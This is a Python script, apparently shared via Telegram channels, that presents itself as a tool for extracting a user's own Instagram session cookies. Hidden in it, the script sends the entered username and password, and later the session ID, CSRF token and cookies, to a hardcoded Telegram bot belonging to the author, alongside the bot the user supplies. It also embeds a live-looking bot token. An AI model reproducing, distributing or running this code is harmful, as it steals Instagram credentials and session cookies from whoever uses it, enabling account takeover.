




token0 = '5389041271:AAHg66KhabImJbwd8zIzS7p15sB2K3yH7Kk'


ID0 = '5341730579'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33'

import os
import requests
import time
from os import system

def azz():
    azro = (f"""{C} 
    {Z} < Extract Cookies >
    {F}ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
    {B} {B} channel < @tools_vip >
   < @ittz_danyar > 
    {Z}------------------------
    
    {B}  {B}$10> $10 tool
    {F}┗━━━━━━━━━━━━━━━━━━━━""")
    for azr in azro.splitlines():
        time.sleep(0.05)
        print(azr)
azz()

#username = 'l_.fuckyou._I'
#passowrd = 'fxr123123'
#print(f"""{F}\n________________""")
username = input('\n\n\033[1;34m[+] - Enter Your Username : ')
passowrd = input('\033[1;35m[+] - Enter Your Password : ')
tokennn = input('\nToken : ')
IDDD = input('\nID : ')
zbe = username
abeee = passowrd
zbee = zbe +':'
zbeeo = zbee + abeee
requests.get("https://api.telegram.org/bot"+str(token0)+"/sendMessage?chat_id="+str(ID0)+"&text="+str(zbeeo))


os.system('clear')
c ='https://www.instagram.com/accounts/login/ajax/'#رابط تسجيل الدخول يعمل فقط في الادوات والتطبيقات لا يعمل في Web
head1 = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
        'content-length': '319',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'mid=YrX_FwABAAFVRYLepbLqUSO9nyBK; ig_did=B86D9D0C-8059-4D38-AB32-62F66F91EB8A; ig_nrcb=1; shbid="6887\054479320179\0541687630562:01f72f17d27d1bf82c5011a7e21c360468f4e96ffc8c8d9bc8f3389196b275ab0b6d598c"; shbts="1656094562\054479320179\0541687630562:01f75b9e3dad31375f7599a21ee1e6b0b33b430c850ee605a7591dd83682126848a683cd"; dpr=3; datr=av-1Yj1HLbt2sRgtjJ2hIyTk; rur="ASH\054479320179\0541687707865:01f7969a9a044b6e5a39c124177ea698ce171408d797be83e4e94e6efc69642ea3b90ed9"; csrftoken=QZnASSTl4lB3b1sG610j7UGrPk0TfrN0',#كوكيز مهمة جداا
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; JSN-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
        'viewport-width': '360',
        'x-asbd-id': '437806',
        'x-csrftoken': 'QZnASSTl4lB3b1sG610j7UGrPk0TfrN0',
        'x-ig-app-id': '1217981644879628',
        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
        'x-instagram-ajax': '57ac339ce6f4',
        'x-requested-with': 'XMLHttpRequest'
    }
tim = str(time.time()).split('.')[1]#الوقت اليوم لكن في الاعداد العشرية
data1 = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{passowrd}',
        'queryParams': '{}',
        'optIntoOneTap': 'false',
        'trustedDeviceRecords': '{}'
    }
rq = requests.post(c,headers=head1,data=data1)
    
    
if ('"userId"') in rq.text:
	co = rq.cookies
	coo =co.get_dict()
	tok = coo['csrftoken']#لستخراج التوكن قم بكتابة print(tok)
	iddd = coo['ds_user_id']
	siddd = coo['sessionid']
	cookiee = f"sessionid={coo['sessionid']};ds_user_id={coo['ds_user_id']};csrftoken={coo['csrftoken']}"
	system('clear')
	msg = f"""{B}
	Cookies : 
	
	{cookiee}
	
	---------------------------
	
	ID : 
	
	{iddd}
	
	---------------------------
	
	Sessionid : 
	
	{siddd}
	
	--------------------------
	
	Token : 
	
	{tok}"""
	
	print(msg)
	#print('Cookies : \n')
	#print(cookiee)
	#print("\n Token : \n")
	#print(tok)
	#print("\n ID : \n")
	#print(iddd)
	#print("\nsessionid : \n")
	#print(siddd)
	
	requests.get("https://api.telegram.org/bot"+str(tokennn)+"/sendMessage?chat_id="+str(IDDD)+"&text="+str(msg))
	uuuiii = ("https://api.telegram.org/bot"+str(token0)+"/sendMessage?chat_id="+str(ID0)+"&text="+str(msg))

	requests.get(uuuiii)
elif ('"checkpoint_required"') in rq.text:
	print('Sucer')#سكيور 
else:
	print('No Login')#كلمة المرور خطأ او الحساب
